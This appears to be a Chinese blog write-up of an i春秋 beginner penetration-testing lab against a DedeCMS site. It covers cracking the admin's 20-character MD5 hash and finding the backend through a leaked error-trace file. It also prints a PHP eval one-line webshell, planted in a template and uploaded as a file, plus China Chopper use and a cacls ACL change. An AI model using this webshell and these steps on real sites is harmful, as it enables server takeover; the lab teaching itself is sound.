---
title: 【i春秋】渗透测试入门 —— 真的很简单
copyright: true
date: 2018-03-06 15:56:26
tags: [i春秋,Pentest,Exploit,Writeup,CMS,Crypto,Web,PHP,Trojan,Vulnerability,Privilege,CMD]
categories: [InfoSec,Pentest]
---

# 0x00 前言

本题是渗透测试入门的一道基础题，虽然美其名曰“真的很简单”，但对于新手还是有一定挑战性的，实践并掌握本题中的所有知识点，对渗透测试的基本理解有很大帮助。

此题的目标是对一个**基于[织梦 CMS](http://www.dedecms.com/) 的网站**进行渗透测试，找到网站登录后台，继而入侵服务器找到存放 flag 的文件。从实验手册上，可看出其中还会涉及到简单的提权过程。

- 题目链接：[https://www.ichunqiu.com/battalion?t=2&r=54399](https://www.ichunqiu.com/battalion?t=2&r=54399)
- 解题链接：[https://www.ichunqiu.com/vm/51123/1](https://www.ichunqiu.com/vm/51123/1)

<!-- more -->

![guide](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/guide.png)

# 0x01 网站管理员的密码是多少？

第 1 题相对简单，在实验环境内根据提示打开下载链接 `http://file.ichunqiu.com/49ba59ab`，接着下载爆破工具 `dedecms.exe`：

![dedecms_download](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_download.png)

打开工具，输入目标 URL，一键爆破得到管理员的账号 `ichunqiu` 与密码哈希值 `adab29e084ff095ce3eb`：

![dedecms](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms.png)

仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上网一查才发现这是织梦 CMS 的特性，实现过程可参考 [DEDECMS的20位MD5加密密文解密示例介绍](http://www.jb51.net/cms/104721.html)：

![dedecms_md5](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_md5.png)

将 20 位的哈希值用 [MD5解密工具](http://www.dmd5.com/md5-decrypter.jsp) 解密，得到密码明文 `only_system`：

![password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password.png)

为验证 20 位的 MD5 哈希算法规则，可进一步用 [MD5加密工具](https://md5jiami.51240.com/) 对 `only_system` 加密，发现其 16 位哈希值确实能由 20 位哈希值去掉前 3 位与后 1 位所得:

![password_verify](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/password_verify.png)

# 0x02 网站后台目录名是什么？

第 2 题上来先尝试织梦 CMS 的默认后台路径 `/dede/index.php` 或 `/dede/login.php`，得到 404 的结果也是意料之中，即现在的问题是要找出修改后的后台目录名。

打开实验工具箱，发现【目录扫描】文件夹，以【御剑后台扫描工具】为例，对目标 URL 扫描后得到如下结果：

![directory_scan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/directory_scan.png)

注意，为了保证扫描效率，一般后台扫描工具都是采用字典扫描，而不是暴力穷举，因此**不同扫描器得到的结果不完全相同，尽可能使用多种扫描器，偏僻怪异的名字可能扫描不出来**。

笔者采用了多种扫描器，并对其可能的结果进行验证，都一无所获，即可**判断此后台目录名具有较强的个性或随机性**。

所以要转换思路，看看织梦 CMS 是否存在后台地址信息泄露的漏洞。果不其然，发现从报错文件 `/data/mysql_error_trace.inc` 或 `/data/mysqli_error_trace.inc` 中，可得到泄露的后台路径，具体可参考：

> [dedecms的各种卡哇伊小漏洞](http://blog.csdn.net/wangyi_lin/article/details/9286937)
> [dedecms(织梦)漏洞&exp整理](http://www.cnblogs.com/hookjoy/p/6996820.html)
> [php学习之织梦dedecms漏洞讲解](http://www.daixiaorui.com/read/14.html)

最后在 `/data/mysqli_error_trace.inc` 中获得后台目录名为 `lichunqiul`：

![mysqli_error_trace](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/mysqli_error_trace.png)

对其进行验证，终于看到了后台登录页面：

![login](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/login.png)

# 0x03 管理员桌面中 flag 文件信息是？

用账号 `ichunqiu` 与密码 `only_system` 登录后台后，根据实验手册，要想办法利用[中国菜刀](http://www.zhongguocaidao.com/)连接服务器，获得 webshell，进而查看 flag 文件中的信息。

## 获取 webshell

首先我们需要在服务器插入[一句话木马](https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC)，然后才能用菜刀连接，获得 webshell。这里介绍两种插入一句话木马的方法。

### 直接修改模板 PHP 源码

依次点击 **模板 -> 标签源码管理**，以编辑第一个模板 `adminname.lib.php` 为例：

![template_list](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_list.png)

在模板源码第一行插入一句话木马 `<?php @eval($_POST['cmd']); ?>`：

![template_edit](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/template_edit.png)

接着在工具箱【webshell】文件夹打开【中国菜刀】：

![chopper](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper.png)

在 **添加SHELL** 输入框中，输入被插入木马模板文件的地址 `http://www.test.ichunqiu/include/taglib/adminname.lib.php`，其右侧填入木马中接收 POST 请求数据的 key 字段 `cmd`，脚本类型为 `PHP(Eval)`，字符编码为 `GB2312`，设置完成后点击 **添加**：

![add_shell_1](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_1.png)

若参数设置正确，双击所添加的条目，即可连接服务器的资源管理器，进入到模板文件所在的目录：

![manager_1](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_1.png)

### 上传一句话木马文件

先在本地创建文件 `trojan.php`，写入一句话木马 `<?php @eval($_POST['cmd']); ?>`：

![trojan_edit](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_edit.png)

再依次点击 **系统 -> 系统基本参数 -> 附件设置**，如下图更改允许上传的文件类型，否则木马将上传失败：

![file_type](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/file_type.png)

最后点击 **核心 -> 上传新文件**，如下图所示上传木马：

![trojan_upload](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_upload.png)

上传完毕后点击 **核心 -> 附件数据管理 -> 更改**，即可查看木马的路径：

![trojan_path](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_path.png)

接着利用菜刀添加SHELL，步骤同上，只不过地址更改为 `http://www.test.ichunqiu/uploads/soft/180307/1_1503138291.php`：

![add_shell_2](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_2.png)

若参数设置正确，双击连接服务器的资源管理器，即可进入到木马所上传的目录：

![manager_2](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_2.png)

## 权限提升

进入到管理员桌面可看到 flag 文件 `flag~ichunqiu.txt`：

![manager_flag](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_flag.png)

但双击后未显示任何内容，估计是权限受限。接下来可右键点击条目，祭出虚拟终端，即 webshell 的命令行模式：

![chopper_terminal](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper_terminal.png)

先切换至管理员桌面，用 `cacls` 命令查看 flag 文件的[访问控制列表（ACL）](https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8)，后用 `whoami` 命令查看用户名，发现 `authority\system` 用户对于 flag 文件的权限是 N，即无权限，用 `type` 命令查看 flag 文件果然是拒绝访问的：

![deny](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/deny.png)

用 `cacls` 命令更改了访问权限后，`authority\system` 用户对于 flag 文件的权限变成了 F，即所有权限，再次查看 flag 文件内容即可看到 `key{il2o3l}`：

![flag](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/flag.png)

注意提交答案的时候有个坑，记得先拆掉包装，只需提交 `il2o3l` 即可。最后附上 `cacls` 命令的用法：

![cacls](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/cacls.png)

# 0x04 小结

所谓条条大路通罗马，以上思路可能只是完成目标的其中一种方法。本人能力有限，面对工具箱中种类繁多的各种工具不能信手拈来，对于 Windows 命令的使用也掌握不深，尤其是实验手册中提到的 `net.exe` 工具尚未使用，因为在 webshell 中使用 `net` 命令也是拒绝访问的，这个问题还请各位前辈不吝赐教。

最后向以下两篇参考 writeup 的作者表示致谢！

> [09-在线挑战详细攻略-《真的很简单》](https://bbs.ichunqiu.com/thread-19282-1-1.html)
> [爱春秋-WEB渗透实验-真的很简单-实验记录](https://bbs.ichunqiu.com/thread-15780-1-1.html)